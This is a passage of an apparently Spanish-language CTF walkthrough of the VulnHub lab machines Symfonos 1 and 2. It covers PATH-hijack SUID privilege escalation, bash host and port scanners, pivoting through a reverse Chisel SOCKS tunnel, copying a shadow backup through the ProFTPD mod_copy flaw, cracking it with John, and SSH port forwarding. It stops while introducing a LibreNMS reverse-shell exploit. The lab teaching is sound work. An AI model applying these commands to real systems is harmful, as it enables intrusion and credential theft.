<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Creamos un fichero llamado curl</span></span><br><span class="line"><span class="built_in">touch</span> curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Le asignamos permisos de ejecucción</span></span><br><span class="line"><span class="built_in">chmod</span> +x curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Vamos a modificar los privilegios de la bash del sistema para darle permisos SUID</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Abrimos el archivo y ponemos lo siguiente(recuerda que esto se ejecutará con el usuario root)</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/bash</span><br></pre></td></tr></table></figure></div>

<p>Al asignarle privilegios SUID a la bash todo el usuario que invoque una nueva bash esta será iniciada por el usuario root y se la devolverá con dicho usuario.</p>
<p>Ahora vamos a modificar el path para que encuentre nuestro archivo como antes hemos comentado:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Puedes poner el directorio local (.) o /dev/shm o donde estes</span></span><br><span class="line"><span class="built_in">export</span> PATH = .:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/modificando_el_path_symfonos1.png" class="" title="Modificando el PATH">

<p>Ejecutamos el programa: &#x2F;opt&#x2F;statuscheck</p>
<p>¿Porque no se ve nada de output?<br>Porque el curl ha sido secuestrado y se utiliza el curl creado por nosotros.</p>
<p>Checkar que la bash se le ha asignado permisos, deberías apreciar una <strong>s</strong></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /bin/bash</span><br></pre></td></tr></table></figure></div>
<p>Y utilizamos el siguiente comando para elevar los privilegios.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>-p</strong>: -p de privilageeeee.</li>
</ul>
<p>Fijate que no hace falta poner sudo delante porque la bash es SUID.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/escalada_exitosa_root_symfonos1.png" class="" title="Entramos como el usuario root">

<p>Puedes ver la flag de root, aunque en Vulnhub no sirve para nada:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/flag_root_symfonos1.png" class="" title="Flag de root">

<h1 id="Empezamos-el-pivoting"><a href="#Empezamos-el-pivoting" class="headerlink" title="Empezamos el pivoting"></a>Empezamos el pivoting</h1><p>Para hacer el pivoting no hacía falta disponer de root, pero marcamos como completa la máquina.</p>
<h2 id="Host-discovery"><a href="#Host-discovery" class="headerlink" title="Host discovery"></a>Host discovery</h2><p>Vamos a crear un archivo bash ejecutable(darle permisos de ejecucción).</p>
<ul>
<li><strong>&#x2F;dev&#x2F;shm</strong>: Archivos almacenados en RAM, son más rápidos, pero se borran al reiniciar el archivo.</li>
</ul>
<p>En este caso lo voy a llamar hostDiscovery.sh y va a tener el siguiente contenido:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ctrl_c</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;\n\n[!] Saliendo...\n&quot;</span></span><br><span class="line">	tput cnorm</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> ctrl_c INT</span><br><span class="line"></span><br><span class="line">tput civis</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254); <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">timeout</span> 1 bash -c <span class="string">&quot;ping -c 1 192.168.100.<span class="variable">$i</span>&quot;</span> &amp;&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] El host 192.168.100.<span class="variable">$i</span> esta activo&quot;</span> &amp;</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">wait</span></span><br><span class="line"></span><br><span class="line">tput cnorm</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/host_discovery_result.png" class="" title="Host descubiertos en la red inaccesible.">

<p>Podeis apreceiar que aparecen muchas IP, pero estás son generadas por la forma que se crea el adaptador NAT en virtualbox, nuestra ip es la 192.168.100.4 y otra máquina que está conectada es la <strong>192.168.100.5</strong>.</p>
<p>Con los siguientes comandos podemos descubrir para que son algunas ips generadas con virtualbox:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VBoxManage list natnetworks</span><br><span class="line">VBoxManage list dhcpservers</span><br></pre></td></tr></table></figure></div>

<p>192.168.100.3 -&gt; Servidor DHCP.<br>192.168.100.2 -&gt; No aparece, pero puede que sea el name server.<br>192.168.100.1 -&gt; Default gateway. Se conecta con nuestro equipo host y manda el tráfico por internet.</p>
<p>Un truco, si en la máquina Symfonos 2 no os muestra la ip, os aparece localhost(127.0.0.1) a mi me ha funcionado apagar las dos máquinas y encender primero Symfonos2 y luego Symfonos1.</p>
<h3 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h3><p>Puedes subir un binario compilado de nmap o te puedes crear tu propia utilidad:</p>
<p>Os recomiendo copiaros hostDiscovery.sh y llamarlo <strong>portDiscovery.sh</strong> ya que vamos a reutilizar parte del script.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ctrl_c</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;\n\n[!] Saliendo...\n&quot;</span></span><br><span class="line">	tput cnorm</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> ctrl_c INT</span><br><span class="line"></span><br><span class="line">tput civis</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65535); <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">timeout</span> 1 bash -c <span class="string">&quot;echo &#x27;&#x27; &gt; /dev/tcp/192.168.100.5/<span class="variable">$port</span> 2&gt;/dev/null &amp;&amp; echo &#x27;[+] Puerto <span class="variable">$port</span> abierto&#x27;&quot;</span> &amp;</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">wait</span></span><br><span class="line"></span><br><span class="line">tput cnorm</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>echo ‘’ &#x2F;dev&#x2F;tcp&#x2F;192.168.100.5&#x2F;$port</strong>: Intenta establecer una conexión mediante TCP al host y puerto indicado.</li>
<li><strong>2&gt;&#x2F;dev&#x2F;null</strong>: Al establecer la conexión no emite ningún tipo de output así que solo con no mostrar los errores vale.</li>
</ul>
<p>El programa puede tardar un rato en ejecutarse, si no os funciona ctrl+c podéis utilizar ctrl+z y en caso de no ver el cursor poner tput cnorm como en el script.</p>
<h2 id="Tunel-proxy-con-Chisel"><a href="#Tunel-proxy-con-Chisel" class="headerlink" title="Túnel proxy con Chisel."></a>Túnel proxy con Chisel.</h2><p>Vamos a montarnos un túnel con Chisel para poder tener accesible los puertos de la máquina víctima.</p>
<p>El primer paso es descargarnos <a class="link"   target="_blank" rel="noopener" href="https://github.com/jpillora/chisel" >Chisel<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, recomiendo ir a las releases y descargar la última versión disponible, si utilizas arch puedes instalarlo mediante AUR(chisel-jpillora) o añadiendo los repositorios de black arch y descargarlo con pacman.</p>
<p>En caso de descargar la última release desde github o al hacer la copia de &#x2F;usr&#x2F;bin&#x2F;chisel, si quieres reducir el peso del ejecutable ya que está en go, puedes utilizar los siguientes comandos:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Para ver el peso del archivo</span></span><br><span class="line"><span class="built_in">du</span> -hc chisel</span><br><span class="line"></span><br><span class="line"><span class="comment"># Para disminuir el peso(Así tardará menos en subirse a la máquina víctima)</span></span><br><span class="line">upx chisel</span><br></pre></td></tr></table></figure></div>

<p>Para pasar el archivo nos creamos un servidor web en python en el directorio donde está chisel(por defecto ya tiene directory listening activado y podemos ver los activos y descargarnoslos-</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>

<p>Para descargarlo en la víctima sería con un simple wget:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.160/chisel</span><br></pre></td></tr></table></figure></div>

<p>Le aplicamos permisos de ejecucción:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x chisel</span><br></pre></td></tr></table></figure></div>

<p>Bien, ya disponemos del chisel en las dos máquinas pues vamos a conectar las máquinas, primero empezamos con la máquina atacante(si tu máquina melón):</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server --reverse -p 1234</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><strong>server</strong>: Configurar Chisel en modo servidor, esperando conexiones de clientes.</p>
</li>
<li><p><strong>–reverse</strong>: Configuración para túneles reversos. El cliente inicia la conexión en lugar del servidor y una vez conectado el servidor <strong>recibe</strong> conexiones del cliente para <strong>redirigir</strong> el tráfico.</p>
</li>
<li><p><strong>-p 1234</strong>: Indicas el puerto de conexión.</p>
</li>
</ul>
<p>Tu puedes llevarte puerto por puerto de la máquina que no ves a tu equipo:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.1.160:1234 R:80:192.168.100.5</span><br></pre></td></tr></table></figure></div>

<p>Pero no esto no nos interesa porque es muy tedioso, así que vamos a utilizar la siguiente forma:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.1.160:1234 R:socks</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>client</strong>: Indicamos que nos queremos conectar como cliente.</p>
</li>
<li><p><strong>R:socks</strong>: SOCKS5 permite redirigir el tráfico de <strong>toda máquina alcanzable desde la víctima</strong>.</p>
</li>
</ul>
<p>Una vez nos salga el mensajito de session detectada, podríamos utilizar <strong>proxychains</strong>(&#x2F;etc&#x2F;proxychains.conf) y añadir abajo de todo la conexión(si se cierra alguna conexión el túnel se cierra):</p>
<p>Con proxychain podemos <strong>enrutar</strong> el tráfico de los programas que ejecutemos en nuestro equipo a través del proxy creado, así es cómo si estuvieramos en la máquina víctima.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/proxychains_symfonos1.png" class="" title="Añadiendo el proxy sock5 a proxychain">

<p>Si probamos a testear si el puerto 80 de la máquina que “no vemos” está abierto con nmap:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/primer_nmap_proxychains_erroneo.png" class="" title="Primer nmap después de añadir proxychain.">

<p>¿Pero porque no va, si hemos añadido el proxy?</p>
<p>Vamos a realizar tres cambios:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p80 --open -T5 -v -n 192.168.100.5 -sT -Pn</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>proxychains</strong>: Añadimos proxychains para indicar por donde va a ir la información(en este caso por el proxy que le hemos indicado en el archivo de configuración).</p>
</li>
<li><p><strong>-sT</strong>: Utiliza el formato tradicional del three-handshake, es más lento y menos sigiloso, pero funciona bien a través de proxies. Utiliza directamente la pila del SO(incluye protocolos cómo TCP, UDP…)</p>
</li>
<li><p><strong>-Pn</strong>: No queremos que nos descubra host a través del protocolo ARP.</p>
</li>
</ul>
<p><strong>Importante</strong>. Si tenemos otra línea de proxy y no funciona, recomiendo comentarla(en mi caso tenía la de tor). Si quires quitar los mensajes que salen por consola de proxychains puedes utilizar el parámetro <strong>-q</strong> de quiet.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/primer_nmap_con_proxychains.png" class="" title="Realizamos el primer nmap con proxychains.">

<p>Y vualá, podemos apreciar que el comando ha funciona.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/excalidraw_pivoting_con_tunel.png" class="">

<h1 id="Reconocimiento-Symfonos2"><a href="#Reconocimiento-Symfonos2" class="headerlink" title="Reconocimiento Symfonos2"></a>Reconocimiento Symfonos2</h1><h2 id="Escaneo-de-puertos-1"><a href="#Escaneo-de-puertos-1" class="headerlink" title="Escaneo de puertos"></a>Escaneo de puertos</h2><p>Genial, una vez entendido como podemos ejecutar comandos a través de un túnel, vamos a escanear los puertos de la máquina Symfonos 2:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roxychains -q nmap --top-ports 500 --open -T5 -v -n 192.168.100.5 -sT -Pn -oG allPorts | grep -vE <span class="string">&quot;Discover&quot;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>–top-ports 500</strong>: Solo escaneamos los 500 puertos más importantes ya que el escaneo mediante el parámetro -sT es más lento.</li>
<li><strong>grep -vE “Discover”</strong>:Con la v mostramos los resultados que no coinciden con lo buscado, con -E podemos utilizar expresiones regulares, ej: quieres excluir varias líneas con diferentes palabras “Discover|Open”.</li>
</ul>
<p>Recordar que tenemos la utilidad <strong>extractPorts</strong> ya mencionada en el primer escaneo. El siguiente paso es enumerar la versión y servicio que corresponde con cada puerto, para eso podemos utilizar unos scripts de reconocimiento de nmap</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nmap -sT -Pn -sCV -p21,22,80,139,445 192.168.100.5 -oN targeted</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>-sT</strong>: Seguramente tengamos que arrastrar este parámetro en más de un comando, nmap por defecto usa <strong>SYN Scan(-sS)</strong> si el usuario no tiene permisos manda paquetes raw, TCP connection Scan(-sT) más fácil de detectar y más lento. Yo lo indico para saber en cada momento que estamos haciendo.</li>
</ul>
<img src="/2024/12/04/Symfonos%201%20y%202/targeted_symfonos2.png" class="" title="Targeted symfonos 2">

<h2 id="Exploracion-desde-el-navegador"><a href="#Exploracion-desde-el-navegador" class="headerlink" title="Exploración desde el navegador"></a>Exploración desde el navegador</h2><p>¿Cómo podemos abrir esto desde el navegador?<br>Nosotros ponemos 192.168.100.5 en la URL y no nos carga el recurso, claramente es porque no tenemos acceso, desde la terminal utilizabamos proxychain, aquí en lugar de lanzar firefox con proxychains podemos descargarnos la extensión&#x2F;addon <strong>Foxyproxy</strong> y añadir una entrada como la siguiente:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/foxyproxy_entrada_symfonos2.png" class="">

<p>No os olvideis darle a guardar!.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/foxyproxy_conexion_con_symfonos2.png" class="" title="Nos conectamos al proxy creado con FoxyProxy.">

<p>Antes de ir por la web, vamos a ver que encontramos con smb, ya que el puerto 139 y 445 están abiertos.</p>
<h2 id="Enumeracion-smb"><a href="#Enumeracion-smb" class="headerlink" title="Enumeración smb"></a>Enumeración smb</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q smbclient -L //192.168.100.5 -N</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/first_view_smbclient.png" class="" title="Primer vistazo con smblclient.">

<p>Probamos a meternos a anonymous y descargarnos los archivos que existan.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/smb_download_log_file_symfonos2.png" class="" title="Accedemos y nos descargamos los archivos.">


<p>Si miramos este archivo totalemte realista, podemos encontrar varias cosas extrañas como el <strong>backup del &#x2F;etc&#x2F;shadow</strong> en &#x2F;var&#x2F;backups&#x2F;shadow.bak, pero si bajamos un poco podemos encontrar el usuario <strong>aelous</strong> que esta compartiendo mediante smb el siguiente directorio &#x2F;home&#x2F;aeolus&#x2F;share(en smb el directorio de anonymous).</p>
<img src="/2024/12/04/Symfonos%201%20y%202/mirando_el_archivo_log_smb_symfonos2.png" class="" title="Usuario aeolus encontrado en log.txt">

<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>Volvemos al archivo targeted y vemos que el puerto 21 es un servicio ftp y la versión es <strong>ProFTPD 1.3.5</strong>(ProFTPD es un tipo de software para ftp) podemos apreciar que la versión esta algo anticuada(si buscas en internet te saldrá la última, 1.3.9).</p>
<p>Y si hacemos una rápida busqueda con <strong>searchsploit</strong>:</p>
<p>Lo suyo es ir probando uno por uno, pero para facilitar las cosas, el único que nos va a servir de ayuda es el último:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/searchsploit_proftpd_symfonos2.png" class="" title="Buscamos con searchsploit proftpd 1.3.5">

<p>Vamos a inspeccionarlos con <strong>searchsploit -x linux&#x2F;remote&#x2F;36742.txt</strong></p>
<p>Esta vulnerabilidad nos permite(sin estar autenticados) <strong>copiar un recurso de origen</strong>(site cpfr &#x2F;etc&#x2F;passwd) <strong>a un recurso de destino</strong>(site cpto &#x2F;tmp&#x2F;passwd.copy).</p>
<p>Entramos al servidor ftp</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q ftp 192.168.100.5</span><br></pre></td></tr></table></figure></div>

<p>Y este nos pedirá unas credenciales, puedes probar <strong>las que quieras</strong>, verás que no tendrás acceso, a continuación, te saldrá un <strong>530</strong>, pero, si utilizamos el comando <strong>help</strong> podemos apreciar que el comando <strong>site</strong> está disponible.</p>
<p>A partir de aquí nos debemos de hacer dos preguntas:</p>
<ol>
<li>¿Qué copiamos de origen?</li>
<li>¿Y a dónde lo copiamos de destino?</li>
</ol>
<p>Recordar que antes hemos visto una ruta donde se almacena una copia de seguridad del archivo shadow(&#x2F;var&#x2F;backups&#x2F;shadow.bak), vamos a copiar dicho archivo:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site cpfr /var/backups/shadow.bak</span><br></pre></td></tr></table></figure></div>

<p>En el archivo log.txt también hemos visto que la carpeta compartida por SMB a la que hemos accedido antes(anonymous) estaba en la siguiente ruta del sistema: “&#x2F;home&#x2F;aeolus&#x2F;share”, así que vamos a copiar el archivo ahí:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site cpto /home/aeolus/share/shadow.bak</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/move_shadow_ftp_to_smb_symfonos2.png" class="" title="Movemos el archivo shadow de ftp al directorio de smb.">

<p>Accedemos al recurso compartido y nos descargamos el archivo:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q smbclient //192.168.100.5/anonymous -N</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/download_shadow_attacker_machine_symfonos2.png" class="" title="Descargarmos el archivo shadow.bak.">

<img src="/2024/12/04/Symfonos%201%20y%202/contenido_del_shadow_symfonos2.png" class="" title="Visualizamos el contenido del shadow.">

<h2 id="John-the-ripper-para-crackear-shadow"><a href="#John-the-ripper-para-crackear-shadow" class="headerlink" title="John the ripper para crackear shadow"></a>John the ripper para crackear shadow</h2><p>Con la herramienta John the ripper podemos intentar crackear los hashes existentes en este archivo.</p>
<p>Un truco, si tienes el comando <strong>locate</strong> y no te acuerda donde tienes un archivo es una ruta muy larga, puedes utilizar lo siguiente para agilizar el proceso.</p>
<p>Si utilizas una zsh puedes ejecutar comandos que esten contenidos en $(), para ello te vas al paréntesis de cierre y dándole al tabulador se ejecuta el comando y se cambie por el output, ej:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -w:$(locate rockyou.txt) 192.168.100.5 shadow.bak</span><br></pre></td></tr></table></figure></div>

<p>En mi caso tengo el archivo en la siguiente ruta:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -w:/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt shadow.bak</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/john_the_ripper_shadow_contrase%C3%B1a_aeolus_symfonos2.png" class="" title="Vemos la contraseña del usuario auelus">

<p>🏆 Premio!. Podemos ver que nos encuentra la contraseña de auelus: sergioteamo.</p>
<h2 id="Entramos-mediante-ssh"><a href="#Entramos-mediante-ssh" class="headerlink" title="Entramos mediante ssh"></a>Entramos mediante ssh</h2><p>Usuario y contraseña, ¿dónde puedo probar esto?. Tenemos el servidor ssh abierto por el puerto 22, vamos a darle un intento:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q ssh aeolus@192.168.100.5</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/conexion_ssh_establecida_con_aeolus_symfonos2.png" class="" title="Establecemos conexión por ssh a la máquina symfonos2">


<h2 id="Explotacion-servicio-web-oculto"><a href="#Explotacion-servicio-web-oculto" class="headerlink" title="Explotación servicio web oculto."></a>Explotación servicio web oculto.</h2><p>Para poder hacer el ctrl+L:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>
<p>Comprobamos la versión del sistema operativo:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/lsb_release_symfonos2.png" class="" title="lsb_release -a en la máquina Symfonos 2.">

<p>Intentamos listar los permisos de sudo para este usuario:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure></div>

<p>Nos pide contraseña, introducimos sergioteamo, pero apreciamos que dicho usuario no puede utilizar sudo.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/sudo_l_symfonos2.png" class="" title="Uso del comando sudo -l.">


<p>Mostramos los procesos que se están ejecutando en el sistema:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -faux</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>f</strong>: Forest. Muestra los procesos en un formato árbol.</li>
<li><strong>a</strong>: All. Incluye todos los procesos aunque no sean de este usuario.</li>
<li><strong>u</strong>: User. Información legible para los humanos y más información cómo usuario propieatrio del proceso, comando ejecutado, uso de CPU…</li>
<li><strong>x</strong>: Procesos no vinculados a ninguna terminal, procesos en segundo plano.</li>
</ul>
<p>De un vistazo rápido nada.</p>
<p>Podemos ver los puertos abiertos:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># No existe en la máquina</span></span><br><span class="line">netstat -nat</span><br><span class="line"></span><br><span class="line">ss -nltp</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>ss</strong>: Sockets Staticks. Para mostrar conexiones sobre conexiones de red.</li>
<li><strong>-n</strong>: Muestra las direcciones ip y elimina la resolución DNS.</li>
<li><strong>l</strong>: Muestra solo los socket en estado listening(los que estan a la espera de conexiones entrantes)</li>
<li><strong>t</strong>: Filtra por las conexiones TCP.</li>
<li><strong>-p</strong>: Información sobre los procesos asociados a cada socket, ej: nombre, PID.</li>
</ul>
<p>Podemos apreciar diferentes puertos que no veiamos desde fuera, esto se debe a las diferentes configuraciones de firewall, algunos puertos nuevos por ejemplo serían el 3306, 8080</p>
<img src="/2024/12/04/Symfonos%201%20y%202/ver_puertos_internos_symfonos2.png" class="" title="Puertos internos abiertos.">

<img src="/2024/12/04/Symfonos%201%20y%202/excalidraw_puertos_internos.png" class="">

<p>¿Cómo podemos utilizar dicho puerto?</p>
<h2 id="Acceso-a-servicios-internos-mediante-ssh-tunneling"><a href="#Acceso-a-servicios-internos-mediante-ssh-tunneling" class="headerlink" title="Acceso a servicios internos mediante ssh tunneling."></a>Acceso a servicios internos mediante ssh tunneling.</h2><p>Para ello podemos utilizar ssh para crear un túnel(redirección de puertos).</p>
<p>Antes, podemos checkear que el puerto no tenga ningun servicio corriendo con el comando <strong>lsof -i:8080</strong>.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q ssh aeolus@192.168.100.5 -L 8080:127.0.0.1:8080</span><br></pre></td></tr></table></figure></div>

<p><strong>- -L</strong>: Local Port Forwarding. Esto nos permite que un servicio remoto este accesible localmente, también tienes -R, pero es para remote port forwarding, llevar el servicio de un puerto de la máquina donde estás a la que te conectas.</p>
<p>Recuerda que estas utilizando proxychains y todo el tráfico en realidad va desde Symfonos1.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/puerto_8080_symfonos2.png" class="" title="Resultado del Local Port Forwarding.">

<p>Genial, vemos este panel de login de LibreNMS, programa utilizado para la monitorización de red del sistema y recordamos que tenemos contraseñas, aeolus:sergioteamo y podemos probar si se reutilizan estas:</p>
<p>En la siguiente imagen se puede apreciar un error que suele salir por introducir mal las credenciales:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/error_libre_nms_al_entrar_symfonos2.png" class="" title="Error al entrar a libre_nms">

<p>La reutilización de contraseñas es válida y podemos acceder al panel:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/entrada_valida_libre_nms_symfonos2.png" class="" title="Visualización del portal.">

<h2 id="RCE-en-servicio-web-interno"><a href="#RCE-en-servicio-web-interno" class="headerlink" title="RCE en servicio web interno"></a>RCE en servicio web interno</h2><p>Vamos a buscar al tuntun con searchsploit y vamos a inspeccionar(searchsploit -x php&#x2F;webapps&#x2F;47044.py) el siguente script en Python para entender como funciona y poder realizarlo nosotros de una manera más manual.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/searchsploit_libre_nms_symfonos2.png" class="" title="Searchsploit para librenms">

<p>Al inspeccionar el script podemos ver que el payload es una reverse shell(de monkey pentester en versiones antiguas de netcat)</p>
